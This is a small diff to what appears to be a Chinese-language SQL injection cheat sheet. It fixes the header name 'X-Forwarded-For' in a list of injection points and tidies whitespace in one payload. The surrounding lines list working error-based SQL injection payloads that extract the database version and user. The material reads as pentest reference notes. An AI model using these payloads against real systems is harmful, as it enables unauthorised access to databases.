@@ -4,7 +4,7 @@
 常见的注入点
 --------------------------------------
 - GET/POST/PUT/DELETE参数
-- X-Forward
+- X-Forwarded-For
 - 文件名
 
 Fuzz注入点
@@ -39,7 +39,7 @@ Fuzz注入点
 报错注入
 --------------------------------------
 - ``select 1/0``
-- ``select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a``
+- ``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a``
 - ``extractvalue(1, concat(0x5c,(select user())))``
 - ``updatexml(0x3a,concat(1,(select user())),1)``
 - ``exp(~(SELECT * from(select user())a))``
